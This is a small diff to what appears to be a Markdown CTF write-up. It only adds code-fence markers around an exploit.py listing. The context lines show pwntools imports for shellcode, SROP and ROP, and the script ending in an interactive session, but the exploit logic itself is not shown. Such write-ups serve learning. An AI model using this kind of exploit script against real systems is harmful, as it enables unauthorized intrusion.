@@ -88,6 +88,8 @@ $ asm -c amd64 'syscall; ret'
 <summary>
 exploit.py
 </summary>
+
+```py
 from typing import List, Any, Dict
 import time
 from pwn import context, gdb, ELF, shellcraft, tube, pack, unpack, log, process, p64, p32, SigreturnFrame, ROP, asm, disasm, remote
@@ -160,4 +162,6 @@ io.send(a)
 time.sleep(1)
 
 io.interactive()
+```
+
 </details>
